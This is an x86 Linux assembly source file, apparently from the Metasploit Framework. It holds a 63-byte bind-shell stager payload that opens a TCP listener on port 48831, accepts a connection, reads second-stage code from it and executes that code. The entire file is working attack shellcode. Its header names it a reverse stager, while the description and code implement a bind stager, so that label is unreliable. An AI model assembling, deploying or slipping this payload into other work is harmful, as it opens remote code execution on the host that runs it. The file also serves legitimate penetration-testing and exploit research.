;;
; 
;        Name: stager_sock_reverse
;        Size: 63 bytes
;   Qualities: Can Have Nulls
;     Authors: skape <mmiller [at] hick.org>
;     Version: $Revision$
;     License: 
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        Implementation of a Linux portbind TCP stager.
;
;        File descriptor in edi.
;
;;
BITS   32
GLOBAL _start

_start:
	xor  ebx, ebx

socket:
	push ebx
	inc  ebx
	push ebx
	push byte 0x2
	push byte 0x66
	pop  eax
	cdq
	mov  ecx, esp
	int  0x80
	xchg eax, esi

bind:
	inc  ebx
	push edx
	push word 0xbfbf
	push bx
	mov  ecx, esp
	push byte 0x66
	pop  eax
	push eax
	push ecx
	push esi
	mov  ecx, esp
	int  0x80

listen:
	mov  al, 0x66
	shl  ebx, 1
	int  0x80

accept:
	push edx
	push edx
	push esi
	inc  ebx
	mov  ecx, esp
	mov  al, 0x66
	int  0x80
	xchg eax, ebx

read:
	mov  dh, 0xc
	mov  al, 0x3
	int  0x80
	mov  edi, ebx    ; not necessary if second stages use ebx instead of edi for fd
	jmp  ecx